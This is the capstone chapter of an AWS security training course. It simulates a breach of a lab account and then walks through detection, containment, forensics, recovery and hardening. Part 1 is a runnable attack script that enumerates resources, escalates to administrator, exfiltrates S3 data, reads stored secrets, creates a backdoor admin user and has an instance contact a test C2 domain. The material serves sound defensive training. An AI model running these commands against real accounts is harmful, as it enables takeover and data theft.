# 🎯 Attack → Detect → Respond — The Full Simulation

> **Capstone · Document 29 of 29 — FINAL**  
> **Estimated cost:** Included in capstone budget · **Estimated time:** 4–6 hours  
> **Prerequisites:** `28-building-the-environment-step-by-step.md` — environment must be running

---

## The Scenario

It is a Tuesday morning at AcmeFintech Ltd. You are the security analyst.

```
08:47 — GuardDuty fires: UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B
        dev-alice logged in from an IP in Eastern Europe

09:03 — Security Hub escalates: IAM permissions modified
        Someone attached AdministratorAccess to dev-alice

09:15 — Macie alert: Sensitive data accessed in acme-data bucket
        47 objects containing PII downloaded

09:22 — GuardDuty: CryptoCurrency:EC2/BitcoinTool.B
        The app server is connecting to a mining pool

Your job: contain the attack, preserve evidence, investigate, recover.
```

---

## Part 1 — Simulate the Attack

Run this attack simulation against your enterprise environment:

```bash
# Source the environment
source acme-environment.env

# === PHASE 1: INITIAL ACCESS ===
# Simulate attacker using stolen dev-alice credentials
# (configure dev-alice profile with her access key)
ALICE_PROFILE="dev-alice-attacker"

# === PHASE 2: DISCOVERY ===
echo "[*] Discovery phase..."
aws iam get-user --profile $ALICE_PROFILE
aws iam list-attached-user-policies --user-name dev-alice --profile $ALICE_PROFILE
aws iam list-groups-for-user --user-name dev-alice --profile $ALICE_PROFILE
aws s3 ls --profile $ALICE_PROFILE
aws ec2 describe-instances --profile $ALICE_PROFILE
aws secretsmanager list-secrets --profile $ALICE_PROFILE
sleep 2

# === PHASE 3: PRIVILEGE ESCALATION ===
echo "[*] Privilege escalation..."
aws iam attach-user-policy \
  --user-name dev-alice \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile $ALICE_PROFILE
sleep 2

# === PHASE 4: DATA EXFILTRATION ===
echo "[*] Data exfiltration..."
# Create test sensitive data
echo "CustomerID,Name,SSN,CreditCard,Balance" > /tmp/customer_data.csv
echo "C001,Alice Johnson,123-45-6789,4111111111111111,15420.50" >> /tmp/customer_data.csv
echo "C002,Bob Smith,987-65-4321,5500005555555554,8300.00" >> /tmp/customer_data.csv

# Upload to S3 (simulating legitimate data that was there)
S3_BUCKET="acme-data-$(aws sts get-caller-identity --query Account --output text)"
aws s3 mb s3://$S3_BUCKET --region us-east-2
aws s3 cp /tmp/customer_data.csv s3://$S3_BUCKET/customers/data.csv

# Download it as attacker
aws s3 sync s3://$S3_BUCKET/ /tmp/exfil/ --profile $ALICE_PROFILE
echo "[!] Exfiltrated $(ls /tmp/exfil/ | wc -l) files"
sleep 2

# === PHASE 5: SECRETS ACCESS ===
echo "[*] Accessing secrets..."
aws secretsmanager get-secret-value \
  --secret-id acme/database/credentials --profile $ALICE_PROFILE
aws secretsmanager get-secret-value \
  --secret-id acme/api/payment-gateway --profile $ALICE_PROFILE
sleep 2

# === PHASE 6: PERSISTENCE ===
echo "[*] Creating backdoor..."
aws iam create-user --user-name acme-backdoor --profile $ALICE_PROFILE
aws iam attach-user-policy \
  --user-name acme-backdoor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile $ALICE_PROFILE
BACKDOOR_KEY=$(aws iam create-access-key \
  --user-name acme-backdoor \
  --profile $ALICE_PROFILE)
echo "[!] Backdoor user created with keys: $(echo $BACKDOOR_KEY | jq -r '.AccessKey.AccessKeyId')"
sleep 2

# === PHASE 7: SIMULATE MINING ON EC2 ===
# Trigger GuardDuty by querying the test C2 domain from app server
# (via SSM so we don't need SSH)
aws ssm send-command \
  --instance-ids $APP_ID \
  --document-name AWS-RunShellScript \
  --parameters 'commands=["curl http://guarddutyc2activityb.com"]' \
  --profile $ALICE_PROFILE

echo ""
echo "[*] Attack simulation complete. Wait 5-10 minutes for GuardDuty findings."
echo "[*] Now switch to defender role."
```

---

## Part 2 — Detect (Blue Team Mode)

Wait 5–10 minutes after the attack. Now act as the security analyst.

### Step 1 — Check Security Hub first (single pane of glass)

```
Security Hub → Findings → filter: Severity = HIGH, CRITICAL → sort by newest
```

You should see:
- `UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B`
- `Persistence:IAMUser/UserPermissions`
- `Exfiltration:S3/AnomalousBehavior` (if Macie is enabled)
- `CryptoCurrency:EC2/BitcoinTool.B` (after 10–15 minutes)

### Step 2 — Reconstruct the timeline in CloudTrail

```sql
-- CloudWatch Logs Insights → /cloudtrail/acme
-- Full attacker activity timeline

fields eventTime, eventName, sourceIPAddress, errorCode
| filter userIdentity.userName = "dev-alice"
| sort eventTime asc
| limit 200
```

Build your timeline from the output:

```markdown
## Attack Timeline Reconstruction

HH:MM:SS  ConsoleLogin — dev-alice — [ATTACKER IP]
HH:MM:SS  ListBuckets — enumeration begins
HH:MM:SS  DescribeInstances — infrastructure mapping
HH:MM:SS  ListSecrets — secret discovery
HH:MM:SS  AttachUserPolicy — PRIVILEGE ESCALATION (AdministratorAccess)
HH:MM:SS  GetSecretValue — acme/database/credentials
HH:MM:SS  GetSecretValue — acme/api/payment-gateway  
HH:MM:SS  GetObject (×47) — S3 data exfiltration
HH:MM:SS  CreateUser — acme-backdoor (PERSISTENCE)
HH:MM:SS  CreateAccessKey — acme-backdoor
```

### Step 3 — Scope the blast radius

```bash
# What secrets were accessed?
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue \
  --start-time $(date -u -d "2 hours ago" +%Y-%m-%dT%H:%M:%SZ) \
  --query 'Events[*].CloudTrailEvent' --output text | \
  python3 -c "import sys,json; [print(json.loads(e).get('requestParameters',{}).get('secretId','')) for e in sys.stdin]"

# What S3 data was exfiltrated?
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=GetObject \
  --start-time $(date -u -d "2 hours ago" +%Y-%m-%dT%H:%M:%SZ) \
  --query 'Events[*].CloudTrailEvent' --output text | \
  python3 -c "import sys,json; [print(json.loads(e).get('requestParameters',{}).get('key','')) for e in sys.stdin]"

# What backdoors were created?
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateUser \
  --start-time $(date -u -d "2 hours ago" +%Y-%m-%dT%H:%M:%SZ)

aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateAccessKey \
  --start-time $(date -u -d "2 hours ago" +%Y-%m-%dT%H:%M:%SZ)
```

---

## Part 3 — Contain

### Immediate containment (under 10 minutes)

```bash
# === 1. CONTAIN dev-alice ===
echo "[*] Disabling dev-alice..."

# Disable access keys
ALICE_KEYS=$(aws iam list-access-keys --user-name dev-alice \
  --query 'AccessKeyMetadata[*].AccessKeyId' --output text)
for KEY in $ALICE_KEYS; do
  aws iam update-access-key --user-name dev-alice \
    --access-key-id $KEY --status Inactive
  echo "    Disabled key: $KEY"
done

# Delete console access
aws iam delete-login-profile --user-name dev-alice 2>/dev/null

# Attach deny-all emergency policy
aws iam put-user-policy \
  --user-name dev-alice \
  --policy-name EMERGENCY-DENY-ALL \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":"*","Resource":"*"}]}'

echo "[✓] dev-alice contained"

# === 2. DESTROY THE BACKDOOR ===
echo "[*] Removing backdoor user acme-backdoor..."

BACKDOOR_KEYS=$(aws iam list-access-keys --user-name acme-backdoor \
  --query 'AccessKeyMetadata[*].AccessKeyId' --output text 2>/dev/null)
for KEY in $BACKDOOR_KEYS; do
  aws iam delete-access-key --user-name acme-backdoor --access-key-id $KEY
done

aws iam detach-user-policy --user-name acme-backdoor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess 2>/dev/null

aws iam delete-user --user-name acme-backdoor

echo "[✓] Backdoor user removed"

# === 3. ISOLATE THE COMPROMISED EC2 INSTANCE ===
echo "[*] Isolating app server $APP_ID..."
aws ec2 modify-instance-attribute \
  --instance-id $APP_ID \
  --groups $ISOLATION_SG

# Tag it
aws ec2 create-tags \
  --resources $APP_ID \
  --tags \
    Key=SecurityStatus,Value=COMPROMISED \
    Key=IsolatedAt,Value=$(date -u +%Y-%m-%dT%H:%M:%SZ) \
    Key=CaseID,Value=IR-ACME-001

echo "[✓] App server isolated"

echo ""
echo "=== IMMEDIATE CONTAINMENT COMPLETE ==="
echo "Time elapsed: $(date)"
```

### Preserve evidence (before any remediation)

```bash
# === TAKE EBS SNAPSHOT FOR FORENSICS ===
echo "[*] Acquiring forensic evidence..."

# Get the root volume of the compromised instance
VOLUME_ID=$(aws ec2 describe-instances \
  --instance-ids $APP_ID \
  --query 'Reservations[0].Instances[0].BlockDeviceMappings[0].Ebs.VolumeId' \
  --output text)

# Stop instance for consistent snapshot
aws ec2 stop-instances --instance-ids $APP_ID
aws ec2 wait instance-stopped --instance-ids $APP_ID

SNAPSHOT_ID=$(aws ec2 create-snapshot \
  --volume-id $VOLUME_ID \
  --description "FORENSIC-IR-ACME-001-$(date +%Y%m%d-%H%M%S)" \
  --tag-specifications "ResourceType=snapshot,Tags=[
    {Key=CaseID,Value=IR-ACME-001},
    {Key=Purpose,Value=ForensicEvidence},
    {Key=SourceInstance,Value=$APP_ID},
    {Key=AcquiredAt,Value=$(date -u +%Y-%m-%dT%H:%M:%SZ)}
  ]" \
  --query 'SnapshotId' --output text)

echo "[✓] Forensic snapshot: $SNAPSHOT_ID"

# === ROTATE ALL EXPOSED SECRETS ===
aws secretsmanager rotate-secret --secret-id acme/database/credentials
aws secretsmanager rotate-secret --secret-id acme/api/payment-gateway
echo "[✓] Secrets rotated"
```

---

## Part 4 — Investigate (Forensics Phase)

### Disk forensics on the compromised app server

```bash
# Create forensic volume from snapshot (document 16)
FORENSIC_VOLUME=$(aws ec2 create-volume \
  --snapshot-id $SNAPSHOT_ID \
  --availability-zone us-east-2a \
  --volume-type gp3 \
  --query 'VolumeId' --output text)

# Attach to a clean forensic workstation
# (Launch one in the security subnet if not already running)
aws ec2 attach-volume \
  --volume-id $FORENSIC_VOLUME \
  --instance-id <forensic-ws-id> \
  --device /dev/sdf

# SSH into forensic workstation
# sudo mount -o ro,noexec,nosuid /dev/xvdf /mnt/evidence

# Find the attacker's activity on disk
# sudo find /mnt/evidence -newer /mnt/evidence/tmp -type f -ls 2>/dev/null
# sudo cat /mnt/evidence/var/log/auth.log | grep "Accepted\|Failed"
# sudo cat /mnt/evidence/home/ec2-user/.bash_history
```

### CloudTrail deep investigation

```sql
-- Full incident timeline ordered by time
fields eventTime, eventName, userIdentity.userName,
       userIdentity.type, sourceIPAddress, errorCode
| filter eventTime > "ATTACK-START-TIME"
| filter eventTime < "CONTAINMENT-TIME"
| sort eventTime asc
| limit 500
```

```sql
-- Check all regions for attacker activity (they may have gone global)
fields eventTime, awsRegion, eventName, userIdentity.userName
| filter userIdentity.userName in ["dev-alice", "acme-backdoor"]
| stats count(*) as actions by awsRegion
| sort actions desc
```

```sql
-- VPC Flow Logs — network activity during the attack window
-- (in /vpc/acme-flowlogs log group)
fields @timestamp, srcaddr, dstaddr, dstport, bytes, action
| filter @timestamp > "ATTACK-START-TIME"
| filter srcaddr like /^10\.0\.2\./
| sort bytes desc
| limit 50
```

### Write the incident report

```markdown
# Incident Report — IR-ACME-001

**Date:** [Today]
**Classification:** Compromised IAM Credentials + EC2 Compromise
**Severity:** Critical
**Status:** Contained

## Executive Summary
IAM user dev-alice credentials were compromised. The attacker performed
reconnaissance, escalated to administrator privileges, exfiltrated 47
S3 objects containing customer PII, accessed 2 secrets (database
credentials and payment gateway API key), established a backdoor admin
user, and deployed a cryptomining payload on the app server.

## Timeline
[Paste your reconstructed timeline here]

## Impact Assessment
- Customer PII accessed: 2 records (SSN, credit card data)
- Secrets exposed: Database credentials, Payment gateway API key
- EC2 instance compromised: acme-app-server ($APP_ID)
- Backdoor created: acme-backdoor (now deleted)
- Financial exposure: Cryptomining charges (minimal, quickly detected)

## Evidence Collected
- CloudTrail: All API activity logged (integrity: verified)
- EBS snapshot: $SNAPSHOT_ID (chain of custody: maintained)
- VPC Flow Logs: Network activity captured
- GuardDuty findings: 4 findings generated

## Containment Actions
- dev-alice: access keys disabled, console access removed, deny-all policy attached
- acme-backdoor: user and all keys deleted
- App server: isolated with quarantine security group
- All exposed secrets: rotated

## Root Cause
[Identify how dev-alice credentials were compromised]
Options: phishing / access key in public repository / weak password

## Regulatory Notification Assessment
- Customer PII accessed → assess GDPR/CCPA/Kenya DPA obligations
- Credit card data accessed → PCI DSS breach notification required
- Notify relevant authorities within required timeframes

## Recommendations
1. Enforce MFA for all IAM users (immediate)
2. Enable GitGuardian for repository secret scanning
3. Implement IAM Access Analyzer (detect external access)
4. Enable Macie on all S3 buckets with PII
5. Mandatory security training for all developers
6. Implement just-in-time access (no standing privileges)
```

---

## Part 5 — Recover

```bash
# === RESTORE APP SERVER FROM KNOWN GOOD SNAPSHOT ===
# Find the last good snapshot (before the attack)
GOOD_SNAPSHOT=$(aws ec2 describe-snapshots \
  --filters "Name=tag:Purpose,Values=Backup" "Name=tag:Name,Values=acme-app*" \
  --query 'sort_by(Snapshots, &StartTime)[-1].SnapshotId' \
  --output text)

# Create clean volume from known good snapshot
CLEAN_VOLUME=$(aws ec2 create-volume \
  --snapshot-id $GOOD_SNAPSHOT \
  --availability-zone us-east-2a \
  --query 'VolumeId' --output text)

# Launch clean replacement instance
CLEAN_APP=$(aws ec2 run-instances \
  --image-id ami-0c55b159cbfafe1f0 \
  --instance-type t2.small \
  --key-name acme-bastion-key \
  --subnet-id $APP_SUBNET \
  --security-group-ids $APP_SG \
  --iam-instance-profile Name=acme-app-profile \
  --metadata-options "HttpTokens=required,HttpEndpoint=enabled" \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=acme-app-server-replacement}]' \
  --query 'Instances[0].InstanceId' --output text)

# Register new instance with ALB
aws elbv2 register-targets \
  --target-group-arn $TG_ARN \
  --targets Id=$CLEAN_APP

# Deregister compromised instance from ALB
aws elbv2 deregister-targets \
  --target-group-arn $TG_ARN \
  --targets Id=$APP_ID

echo "[✓] Clean replacement app server running: $CLEAN_APP"

# === RESTORE dev-alice WITH HARDENED SETUP ===
# Create new credentials only after root cause is fixed
aws iam create-login-profile \
  --user-name dev-alice \
  --password "$(openssl rand -base64 16)Aa1!" \
  --password-reset-required

# Remove emergency deny policy
aws iam delete-user-policy \
  --user-name dev-alice \
  --policy-name EMERGENCY-DENY-ALL

# Enforce MFA (create policy requiring MFA for all actions)
echo "[!] Manual action required: dev-alice must set up MFA before re-enabling"

echo ""
echo "=== RECOVERY COMPLETE ==="
```

---

## Part 6 — Post-Incident Hardening

Apply all lessons learned immediately:

```bash
# 1. Enforce IMDSv2 on ALL instances
for ID in $(aws ec2 describe-instances \
  --filters "Name=instance-state-name,Values=running" \
  --query 'Reservations[*].Instances[*].InstanceId' --output text); do
  aws ec2 modify-instance-metadata-options \
    --instance-id $ID \
    --http-tokens required
  echo "IMDSv2 enforced on $ID"
done

# 2. Enable MFA enforcement policy
cat > mfa-enforcement.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowViewAccountInfo",
      "Effect": "Allow",
      "Action": ["iam:GetAccountPasswordPolicy","iam:ListVirtualMFADevices"],
      "Resource": "*"
    },
    {
      "Sid": "AllowManageOwnMFA",
      "Effect": "Allow",
      "Action": ["iam:CreateVirtualMFADevice","iam:EnableMFADevice",
                 "iam:GetUser","iam:ListMFADevices","iam:ResyncMFADevice"],
      "Resource": ["arn:aws:iam::*:mfa/${aws:username}",
                   "arn:aws:iam::*:user/${aws:username}"]
    },
    {
      "Sid": "DenyAllExceptMFASetupIfNoMFA",
      "Effect": "Deny",
      "NotAction": ["iam:CreateVirtualMFADevice","iam:EnableMFADevice",
                    "iam:GetUser","iam:ListMFADevices","iam:ResyncMFADevice",
                    "iam:ChangePassword","sts:GetSessionToken"],
      "Resource": "*",
      "Condition": {
        "BoolIfExists": {"aws:MultiFactorAuthPresent": "false"}
      }
    }
  ]
}
EOF

aws iam create-policy \
  --policy-name EnforceMFA \
  --policy-document file://mfa-enforcement.json

# Attach to all user groups
for GROUP in acme-developers acme-security acme-dba acme-readonly; do
  aws iam attach-group-policy \
    --group-name $GROUP \
    --policy-arn arn:aws:iam::$(aws sts get-caller-identity --query Account --output text):policy/EnforceMFA
done

echo "[✓] MFA enforcement applied to all groups"

# 3. Enable CloudTrail Insights
aws cloudtrail put-insight-selectors \
  --trail-name acme-audit-trail \
  --insight-selectors '[{"InsightType":"ApiCallRateInsight"},{"InsightType":"ApiErrorRateInsight"}]'

echo "[✓] CloudTrail Insights enabled"

# 4. Lock down S3 at account level
aws s3control put-public-access-block \
  --account-id $(aws sts get-caller-identity --query Account --output text) \
  --public-access-block-configuration \
  "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

echo "[✓] Account-level S3 public access blocked"

echo ""
echo "=== POST-INCIDENT HARDENING COMPLETE ==="
```

---

## 🎓 Capstone Complete — What You Have Achieved

```
PHASE 1 — FOUNDATIONS
  ✓ Built a multi-tier VPC from scratch (CLI and console)
  ✓ Configured IAM for a 5-person team with least privilege
  ✓ Managed EC2 lifecycle, EBS, key pairs
  ✓ Secured S3 with policies, versioning, encryption
  ✓ Deployed layered network security (SGs + NACLs)
  ✓ Established audit logging (CloudTrail + CloudWatch)
  ✓ Protected a $200 budget with cost controls

PHASE 2 — SECURITY OPERATIONS
  ✓ Deployed GuardDuty and interpreted real threat findings
  ✓ Built network forensics capability with VPC Flow Logs
  ✓ Achieved continuous compliance with AWS Config
  ✓ Centralized security posture in Security Hub
  ✓ Protected web applications with WAF
  ✓ Managed encryption keys with KMS
  ✓ Eliminated hardcoded credentials with Secrets Manager

PHASE 3 — CLOUD FORENSICS
  ✓ Acquired forensic disk images from EBS snapshots
  ✓ Reconstructed attacker timelines from CloudTrail
  ✓ Captured volatile memory from running EC2 instances
  ✓ Executed the IAM incident response playbook
  ✓ Investigated S3 data breach and assessed regulatory obligations
  ✓ Automated first response with Lambda isolation

PHASE 4 — RED TEAM
  ✓ Exploited intentionally vulnerable environments (CloudGoat)
  ✓ Executed 12+ IAM privilege escalation paths
  ✓ Demonstrated SSRF → IMDS → credential theft attack chain
  ✓ Enumerated and exploited S3 misconfigurations
  ✓ Used Pacu framework for automated AWS exploitation

CAPSTONE — ENTERPRISE SIMULATION
  ✓ Built a production-replica multi-tier AWS environment
  ✓ Executed a realistic APT-style attack simulation
  ✓ Detected the attack using GuardDuty, CloudTrail, and Security Hub
  ✓ Performed forensic evidence acquisition and analysis
  ✓ Contained, eradicated, and recovered from the incident
  ✓ Applied post-incident hardening
  ✓ Wrote a professional incident report
```

---

## Your Next Steps

### Certifications (in order)

```
Month 1-2:  AWS Cloud Practitioner (CLF-C02)
Month 3-5:  AWS Solutions Architect Associate (SAA-C03)
Month 6-9:  AWS Security Specialty (SCS-C02)  ← your primary target
Month 10+:  AWS Advanced Networking (if desired)
            PNPT or OSCP (for red team credentialing)
            GCFE or GCFA (for cloud forensics credentialing)
```

### Keep practicing

```
# Free resources
TryHackMe: AWS rooms and cloud security paths
HackTheBox: Cloud challenges
Flaws.cloud: Real AWS vulnerability challenges (by Scott Piper)
Flaws2.cloud: Advanced version
CloudGoat: New scenarios added regularly

# Books
"Hacking the Cloud" — hackingthe.cloud (free, online, updated regularly)
"AWS Security" — Dylan Shields
"Cloud Security and Privacy" — Tim Mather
```

### Build your portfolio

```
For every major exercise in this roadmap, document:
  - What you built (architecture diagram)
  - What you attacked (attack path)
  - How you detected it (detection rule)
  - How you responded (IR steps)
  - What you hardened (remediation)

This becomes your portfolio for job applications.
A documented hands-on AWS security project > most certifications.
```

---

## Final Cleanup

```bash
# Run the full teardown from document 28
bash teardown.sh

# Verify nothing is left running
echo "Remaining EC2 instances:"
aws ec2 describe-instances \
  --filters "Name=instance-state-name,Values=running" \
  --query 'Reservations[*].Instances[*].[InstanceId,Tags[?Key==`Name`].Value|[0]]' \
  --output table

echo "Remaining RDS instances:"
aws rds describe-db-instances \
  --query 'DBInstances[*].[DBInstanceIdentifier,DBInstanceStatus]' \
  --output table

echo "Check billing dashboard in 24 hours to confirm $0 ongoing charges"
```

---

> *You started this roadmap with a simulation that confused you about VPCs. You finished it by building, attacking, detecting, and recovering from a full enterprise AWS breach. That is the complete arc of a cloud security professional.*

---

*Capstone Complete · AWS Cybersecurity & Digital Forensics Roadmap*  
*29 of 29 documents · Phase 1–4 + Capstone*
